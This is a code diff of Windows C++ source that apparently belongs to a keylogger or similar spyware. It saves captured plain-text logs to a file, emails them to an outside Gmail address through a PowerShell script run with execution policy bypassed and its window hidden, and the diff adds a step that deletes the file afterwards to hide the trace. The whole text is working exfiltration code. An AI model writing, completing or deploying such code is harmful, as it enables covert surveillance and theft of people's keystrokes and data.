@@ -4,11 +4,10 @@
 #include <string>
 #include <windows.h>
 
-
 void save_logs_to_file() {
     std::lock_guard<std::mutex> lock(g_logMutex);
     if (!g_plainLogs.empty()) {
-        FILE* fp = fopen("attachment.txt", "a+"); // Append mode
+        FILE* fp = fopen("attachment.txt", "a+"); // File saved in the current directory
         if (fp) {
             fwrite(g_plainLogs.data(), 1, g_plainLogs.size(), fp);
             fclose(fp);
@@ -18,14 +17,13 @@ void save_logs_to_file() {
 }
 
 void send_email() {
-    // Build PowerShell command
+
     std::wstring command =
         L"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"email.ps1\" "
         L"-Username MyUserName -Password MyPassword "
-        L"-attachmentpath \"C:\\attachment.txt\" "
+        L"-attachmentpath \"attachment.txt\" "
         L"-email \"receiver@gmail.com\"";
 
-    // Configure startup info for hidden window
     STARTUPINFOW si = { sizeof(si) };
     PROCESS_INFORMATION pi;
     CreateProcessW(
@@ -45,4 +43,6 @@ void send_email() {
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
 
+    // Delete the file after sending the email
+    DeleteFileW(L"attachment.txt");
 }
